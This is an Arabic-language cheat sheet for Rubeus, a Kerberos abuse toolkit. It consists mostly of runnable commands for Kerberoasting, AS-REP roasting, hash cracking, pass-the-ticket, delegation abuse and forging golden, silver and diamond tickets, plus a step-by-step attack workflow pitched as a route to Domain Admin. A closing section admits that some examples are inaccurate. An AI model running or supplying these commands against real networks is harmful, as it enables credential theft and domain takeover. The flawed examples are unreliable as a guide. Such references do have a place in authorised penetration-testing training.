<a id="-rubeus---kerberos-abuse-toolkit"></a>
# 🎫 Rubeus — مجموعة أدوات استغلال Kerberos

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Kerberos Interaction & Abuse
```

يشير الرسم أعلاه إلى التعامل مع Kerberos واستغلاله، وقد حُفظ بتنسيقه الأصلي. تذكرة TGT تتيح طلب تذاكر الخدمات، بينما تمثل تذكرة الخدمة بيانات مصادقة موجّهة إلى خدمة محدّدة. يشير SPN إلى اسم الخدمة، وLUID إلى معرّف جلسة تسجيل دخول محلي.

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

<a id="-table-of-contents"></a>
## 📋 المحتويات

- [ما هو Rubeus؟](#-what-is-rubeus)
- [عمليات التذاكر](#-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [هجمات التذاكر](#-ticket-attacks)
- [هجمات التفويض](#-delegation-attacks)
- [التذاكر الذهبية والفضية (Golden & Silver Tickets)](#-golden--silver-tickets)
- [مرجع سريع](#-quick-reference)

---

<a id="-what-is-rubeus"></a>
## 🎯 ما هو Rubeus؟

**Rubeus** مجموعة أدوات مكتوبة بلغة C# للتعامل مع Kerberos واستغلاله:

- 🎫 **عمليات التذاكر** - طلب التذاكر وتجديدها وعرض تفاصيلها
- 🔓 **Kerberoasting** - استخراج قيم Hash من تذاكر الخدمات
- 🔑 **AS-REP Roasting** - استهداف حسابات لا تتطلب مصادقة مسبقة
- 🎭 **Pass-the-Ticket** - إعادة استخدام تذاكر مسروقة
- ✨ **التذاكر الذهبية/الفضية (Golden/Silver Tickets)** - تزوير التذاكر

---

<a id="-basic-usage"></a>
## 🚀 الاستخدام الأساسي

<a id="running-rubeus"></a>
### تشغيل Rubeus

```powershell
# التنفيذ المباشر
.\Rubeus.exe <command> [options]

# التنفيذ في الذاكرة (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# التحميل باستخدام PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-ticket-operations"></a>
## 🎟️ عمليات التذاكر

<a id="request-tgt"></a>
### طلب تذكرة TGT

```powershell
# باستخدام كلمة مرور
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# باستخدام قيمة NTLM Hash
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# باستخدام مفتاح AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# باستخدام شهادة
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# حفظ الإخراج في ملف
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

<a id="request-tgs"></a>
### طلب تذكرة خدمة TGS

```powershell
# طلب تذكرة خدمة
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# باستخدام TGT من ملف
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

<a id="list-tickets"></a>
### عرض التذاكر

```powershell
# عرض تذاكر المستخدم الحالي
.\Rubeus.exe triage

# عرض جميع التذاكر (يتطلب صلاحيات مسؤول)
.\Rubeus.exe triage /luid:0x3e7

# استخراج تفاصيل التذاكر
.\Rubeus.exe dump
```

<a id="pass-the-ticket"></a>
### Pass-the-Ticket

```powershell
# استيراد التذكرة إلى الجلسة الحالية
.\Rubeus.exe ptt /ticket:base64ticket

# الاستيراد من ملف
.\Rubeus.exe ptt /ticket:ticket.kirbi

# إنشاء جلسة تسجيل دخول جديدة والاستيراد إليها
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

<a id="describe-ticket"></a>
### عرض تفاصيل التذكرة

```powershell
# عرض تفاصيل التذكرة
.\Rubeus.exe describe /ticket:base64ticket

# من ملف
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="-kerberoasting"></a>
## 🍖 Kerberoasting

<a id="basic-kerberoast"></a>
### Kerberoasting أساسي

```powershell
# تنفيذ Kerberoasting على جميع SPNs
.\Rubeus.exe kerberoast

# حفظ الإخراج في ملف (بصيغة hashcat)
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# استهداف مستخدم محدّد
.\Rubeus.exe kerberoast /user:sqlservice

# خفض التشفير إلى RC4 ‏(etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

<a id="advanced-kerberoasting"></a>
### Kerberoasting متقدم

```powershell
# باستخدام TGT محدّدة
.\Rubeus.exe kerberoast /ticket:base64tgt

# إحصاءات فقط (دون تذاكر)
.\Rubeus.exe kerberoast /stats

# استهداف SPN محدّد
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# تشفير AES (أقل لفتًا للانتباه)
.\Rubeus.exe kerberoast /aes

# التصفية بحسب المستخدم
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

<a id="cracking-kerberoast-hashes"></a>
### كسر قيم Hash الناتجة عن Kerberoasting

```bash
# Hashcat (النمط 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="-as-rep-roasting"></a>
## 🔓 AS-REP Roasting

<a id="basic-as-rep-roast"></a>
### AS-REP Roasting أساسي

```powershell
# العثور على مستخدمين لا تتطلب حساباتهم مصادقة مسبقة وتنفيذ Roasting عليهم
.\Rubeus.exe asreproast

# حفظ الإخراج في ملف
.\Rubeus.exe asreproast /outfile:asrep.txt

# استهداف مستخدم محدّد
.\Rubeus.exe asreproast /user:targetuser

# صيغة Hashcat
.\Rubeus.exe asreproast /format:hashcat
```

<a id="cracking-as-rep-hashes"></a>
### كسر قيم Hash الخاصة بـ AS-REP

```bash
# Hashcat (النمط 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="-ticket-attacks"></a>
## 🎭 هجمات التذاكر

<a id="overpass-the-hash-pass-the-key"></a>
### هجوم Overpass-the-Hash (تمرير المفتاح، Pass-the-Key)

```powershell
# الحصول على TGT باستخدام Hash وإنشاء جلسة جديدة
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# باستخدام مفتاح AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# إنشاء عملية منفصلة مخصّصة للجلسة
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

<a id="s4u-service-for-user"></a>
### S4U (خدمة نيابةً عن المستخدم، Service for User)

```powershell
# S4U2Self — انتحال هوية مستخدم أمام الخدمة نفسها
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy — انتحال الهوية أمام خدمة أخرى
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# السلسلة الكاملة
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-delegation-attacks"></a>
## 🔀 هجمات التفويض

<a id="unconstrained-delegation"></a>
### التفويض غير المقيّد (Unconstrained Delegation)

```powershell
# مراقبة تذاكر TGT على مضيف ذي تفويض غير مقيّد
.\Rubeus.exe monitor /interval:5 /nowrap

# مرشّح محدّد
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# جمع تذاكر TGT
.\Rubeus.exe harvest /interval:30
```

<a id="constrained-delegation"></a>
### التفويض المقيّد (Constrained Delegation)

```powershell
# طلب تذكرة لخدمة مسموح بها
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

<a id="resource-based-constrained-delegation"></a>
### التفويض المقيّد المعتمد على المورد (RBCD)

```powershell
# بعد إعداد RBCD باستخدام PowerMad/PowerView
# طلب تذكرة بهوية جهاز المهاجم
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-golden--silver-tickets"></a>
## ✨ التذاكر الذهبية والفضية (Golden & Silver Tickets)

<a id="golden-ticket"></a>
### التذكرة الذهبية (Golden Ticket)

```powershell
# إنشاء تذكرة ذهبية (يتطلب Hash الخاص بـ krbtgt)
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# تحديد المجموعات
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# باستخدام مفتاح AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

<a id="silver-ticket"></a>
### التذكرة الفضية (Silver Ticket)

```powershell
# إنشاء تذكرة فضية (يتطلب Hash الخاص بحساب الخدمة)
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# خدمة LDAP ‏(DCSync)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

<a id="diamond-ticket"></a>
### التذكرة الماسية (Diamond Ticket)

```powershell
# تعديل TGT شرعية
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### أوامر أساسية

| الأمر | الوصف |
|---------|-------------|
| `asktgt` | طلب تذكرة TGT |
| `asktgs` | طلب تذكرة خدمة TGS |
| `kerberoast` | استخراج قيم Hash من تذاكر الخدمات |
| `asreproast` | هجوم AS-REP Roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | خدمة نيابةً عن المستخدم |
| `golden` | تزوير تذكرة ذهبية |
| `silver` | تزوير تذكرة فضية |
| `dump` | استخراج جميع التذاكر |
| `triage` | عرض التذاكر |

<a id="authentication-options"></a>
### خيارات المصادقة

| الخيار | الوصف |
|--------|-------------|
| `/user:` | اسم المستخدم |
| `/password:` | كلمة المرور |
| `/rc4:` | قيمة NTLM Hash |
| `/aes256:` | مفتاح AES256 |
| `/ticket:` | تذكرة بترميز Base64 |

<a id="common-options"></a>
### خيارات شائعة

| الخيار | الوصف |
|--------|-------------|
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | حفظ الإخراج في ملف |
| `/nowrap` | عدم تقسيم Base64 على عدة أسطر |
| `/domain:` | النطاق المستهدف |
| `/dc:` | متحكم النطاق |

<a id="attack-workflow"></a>
### سير عمل الهجوم

```powershell
# 1. تنفيذ Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. كسر قيم Hash
hashcat -m 13100 kerb.txt rockyou.txt

# 3. الحصول على TGT بكلمة المرور التي كُسرت
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. أو تنفيذ Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. الوصول إلى الموارد
dir \\server\share
```

---

<a id="-resources"></a>
## 📚 المراجع

- [مستودع Rubeus على GitHub](https://github.com/GhostPack/Rubeus)
- [مدونة HarmJ0y](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [BloodHound](../../BloodHound/translations/README.ar.md)
- [Impacket](../../Impacket/translations/README.ar.md)
- [Mimikatz](../../Mimikatz/translations/README.ar.md)

---



> **توضيحات التشغيل والجلسات:** حُفظت أمثلة المصدر دون تعديل. `Assembly.LoadFile` يحمّل التجميعة ولا ينفّذ نقطة دخولها وحده؛ راجع [توثيق Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile). الخيار `/luid:0x3e7` يحدّد جلسة بعينها ولا يعرض تلقائيًا كل المستخدمين. كما أن `/ptt` وحده يستخدم الجلسة الحالية، ولا ينشئ جلسة جديدة؛ وتحتاج إدارة جلسة أخرى إلى الصلاحيات المناسبة ومعرّفها الفعلي، لا قيمة المثال `0x123456`. راجع [إدارة التذاكر](https://github.com/GhostPack/Rubeus#ticket-management).
>
> **تزوير التذاكر:** المعامل `/krbtgt:` في أمثلة golden لا يطابق معاملات مفتاح التشفير في [تنفيذ golden الرسمي](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Golden.cs). كذلك يفتقر مثال diamond إلى `/krbkey` المستخدم لفك تشفير TGT وتعديل PAC وإعادة التوقيع؛ كلمة مرور مستخدم عادي لا تمنحه مفتاح krbtgt. راجع [diamond](https://github.com/GhostPack/Rubeus#diamond) و[تنفيذه](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Diamond.cs). القيم المقتطعة مثل SID المنتهي بـ `...` وHASH بدائل توضيحية؛ ويتوقف قبول التذكرة على المفاتيح وبياناتها وسياسات التحقق.
>
> `/rc4opsec` يرشّح الحسابات التي لا تدعم AES، وليس خفضًا عامًا لكل الحسابات. وAES أو وصف «أقل لفتًا للانتباه» لا يضمن عدم الرصد. تتطلب S4U/RBCD إعداد تفويض وصلاحيات ملائمة؛ مجرد إدراج اسم خدمة لا يمنح الإذن. راجع [دليل Rubeus](https://github.com/GhostPack/Rubeus). نمطا Hashcat ‏13100 و18200 يخصّان TGS-REP وAS-REP من etype 23؛ أنواع AES تحتاج إلى النمط الموافق لبياناتها، وفق [مرجع Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes).
>
> تذكرة Silver لخدمة LDAP لا تمنح تلقائيًا حقوق DCSync. يتطلب DCSync حقوق نسخ الدليل الملائمة، ومنها اجتماع GetChanges وGetChangesAll؛ راجع [توثيق DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync). أُبقيت أسماء الخدمات والمفاتيح والـ hashes وبيانات الاعتماد التجريبية كما في الأصل.

<p align="center">
  <b>🎫 أتقن Kerberos!</b><br>
  <i>Rubeus — تذكرتك إلى صلاحيات Domain Admin</i>
</p>
